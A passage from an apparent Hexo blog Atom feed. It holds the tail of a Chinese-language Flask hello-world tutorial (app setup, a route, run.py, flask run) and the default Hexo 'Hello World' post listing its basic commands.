class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line"># __name__ 指定了flask的开始的点，flask根据__name__所指定的文件的位置来识别其他的资源，例如templates，static等文件夹。</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># 在最后面引入，避免了循环引用。</span><br><span class="line">from . import routes</span><br></pre></td></tr></table></figure><ol start="6"><li>定义routes</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from app import app</span><br><span class="line"></span><br><span class="line"># Flask 利用包装函数的概念，将视图和路由控制结合在一起</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">@app.route(&apos;/index&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return &quot;Hello world&quot;</span><br></pre></td></tr></table></figure><ol start="7"><li><a href="http://xn--run-198du22d.py" target="_blank" rel="noopener">定义run.py</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#run.py 是为了flask运行指定的文件，在这里面引入app</span><br><span class="line"></span><br><span class="line">from microblogapp import app</span><br></pre></td></tr></table></figure><ol start="8"><li>启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export FLASK_APP=run.py</span><br><span class="line">flask run </span><br><span class="line"></span><br><span class="line">输入 localhost:5000 完成了第一个应用。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;准备整理最近学习的一系列的flask基础教程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;hello-wor
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2018/06/09/hello-world/"/>
    <id>http://yoursite.com/2018/06/09/hello-world/</id>
    <published>2018-06-09T06:58:25.169Z</published>
    <updated>2018-06-09T13:15:20.126Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
      <category term="test" scheme="http://yoursite.com/categories/test/"/>
    
    
  </entry>
  
</feed>
